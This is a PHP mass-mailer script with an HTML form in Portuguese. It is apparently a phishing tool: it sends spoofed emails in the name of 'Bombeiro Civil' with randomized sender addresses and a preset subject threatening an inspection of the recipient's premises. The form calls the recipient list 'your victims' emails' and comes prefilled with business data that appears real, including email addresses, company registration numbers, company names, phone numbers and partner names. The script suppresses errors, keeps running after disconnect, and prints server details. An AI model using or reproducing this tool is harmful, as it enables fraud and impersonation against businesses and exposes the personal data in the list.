<?php
@ignore_user_abort(TRUE);
error_reporting(0);
@set_time_limit(0);

// Função para gerar um número aleatório
function random_num(){
    $n = '';
    for($x = 0; $x < 4; $x++){
        $n .= rand(1,9);
    }
    return mt_rand(1,2) . $n;
}

$testa = $_POST['veio'];
if ($testa != "") {

    $nome = $_POST['nome'];
    $to = $_POST['emails'];

    $de = $_POST['de'];
    $de = str_replace("%random_num%", random_num(), $de);

    $headers = "From: ".$nome." <".$de.">\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-type: text/html; charset=iso-8859-1\r\n";
    $headers .= "X-Mailer: PHP/".phpversion()."\r\n";

    // Obter os dados dos emails diretamente do formulário
    $lines = explode("\n", $to);
    $i = 0;
    $count = 1;
    $ok = "ok";

    while(isset($lines[$i])) {
        $line = trim($lines[$i]);
        if (!$line) {
            $i++;
            continue;
        }

        // Dividir a linha em partes
        list($current_email, $cnpj, $razao, $telefone, $socio) = explode(';', $line) + [null, null, null, null, null];

        $current_email = trim($current_email);
        $subject = $_POST['assunto'];
        $message = $_POST['html'];

        if ($current_email) {
            // Substituir as tags no assunto e mensagem
            $message = str_replace(['{{cnpj}}', '{{razao}}', '{{telefone}}', '{{socio}}', '%EMAIL%', '%random_num%'],
                                   [trim($cnpj), trim($razao), trim($telefone), trim($socio), $current_email, random_num()],
                                   $message);
            $subject = str_replace(['{{cnpj}}', '{{razao}}', '{{telefone}}', '{{socio}}', '%EMAIL%', '%random_num%'],
                                   [trim($cnpj), trim($razao), trim($telefone), trim($socio), $current_email, random_num()],
                                   $subject);
            
            $message = stripslashes($message);

            // Enviar o email
            if(mail($current_email, $subject, $message, $headers))
                echo "* Numero: $count <b>".$current_email."</b> <font color=green>OK</font><br><hr>";
            else
                echo "* Numero: $count <b>".$current_email."</b> <font color=red>ERRO AO ENVIAR</font><br><hr>";
        } else {
            echo "* Numero: $count <b>".$line."</b> <font color=orange>EMAIL NÃO ENCONTRADO</font><br><hr>";
        }

        $i++;
        $count++;
    }

    if($ok == "ok")
        echo "";
}

?>
<html>

<head>
<title>Envio de Email</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style>
body {
    margin: 0;
    font-family: Arial, Helvetica, sans-serif;
    background-color: #f2f2f2;
    color: #333;
}

.container {
    max-width: 600px;
    margin: 0 auto;
    padding: 20px;
    background-color: #fff;
    box-shadow: 0 4px 8px rgba(0,0,0,0.1);
    border-radius: 8px;
    margin-top: 30px;
}

header {
    background-color: #4CAF50;
    color: #fff;
    text-align: center;
    padding: 10px 0;
    border-radius: 8px 8px 0 0;
}

h1 {
    font-size: 24px;
    margin: 0;
}

form {
    margin-top: 20px;
}

label {
    display: block;
    margin-bottom: 8px;
    font-weight: bold;
}

input[type="text"],
textarea {
    width: calc(100% - 20px);
    padding: 10px;
    margin-bottom: 15px;
    border: 1px solid #ccc;
    border-radius: 4px;
    font-size: 14px;
}

textarea {
    resize: vertical;
}

input[type="submit"] {
    background-color: #4CAF50;
    color: #fff;
    padding: 10px 20px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
}

input[type="submit"]:hover {
    background-color: #45a049;
}

.alerta {
    color: #990000;
    font-size: 12px;
    margin-top: -10px;
}

.info {
    font-size: 12px;
    color: #555;
    margin-top: 10px;
}

</style>
</head>
<body>
<div class="container">
    <header>
        <h1>Envio de Emails</h1>
    </header>
    <form action="" method="post" enctype="multipart/form-data" name="form1">
      <input type="hidden" name="veio" value="sim">
      <label for="nome">De / e-mail :</label>
      <input name="nome" type="text" id="nome" value="Bombeiro Civil">
      <input name="de" type="text" id="de" value="Bombeiro.Civil%random_num%">

      <label for="assunto">Assunto:</label>
      <input name="assunto" type="text" id="assunto" value="%EMAIL%, haverá uma averiguação em suas instalações %random_num%">

      <label for="html">Código HTML:</label>
      <textarea name="html" id="html" rows="8"></textarea>
      <span class="alerta">*Lembrete: texto em HTML</span>

      <label for="emails">Coloque o email de suas vítimas abaixo:</label>
      <textarea name="emails" id="emails" rows="8">carlosgonzales_moratin@outlook.com;76704550000153;CONDOMINIO EDIFICIO OREGON;(47) 33677777 / (47) 33671704;
ccrlos.breem@bol.com.br;18133035000164;PEDRALLI STACKE RESTAURANTE LTDA;(47) 84888103 / (47) 84061425;JOAO MIGUEL PEIXOTO DA SILVA STACKE
thomasmartinsconsultoria@gmail.com;15204344000190;AUTO POSTO BR A.G. LTDA;(47) 30813532;SAFIRA ZIMMERMANN</textarea>
      <span class="alerta">*Separado por quebra de linha</span>

      <input type="submit" name="Submit" value="Enviar">
    </form>
    <div class="info">
        Nome do Servidor: <?php echo $UNAME = @php_uname(); ?><br>
        Sistema Operacional: <?php echo $OS = @PHP_OS; ?><br>
        Endereço IP: <?php echo $_SERVER['SERVER_ADDR']; ?><br>
        Software usado: <?php echo $_SERVER['SERVER_SOFTWARE']; ?><br>
        Email admin: <?php echo $_SERVER['SERVER_ADMIN']; ?> <br>
        Safe Mode: <?php echo $safe_mode = @ini_get('safe_mode'); ?>
    </div>
</div>
</body>
</html>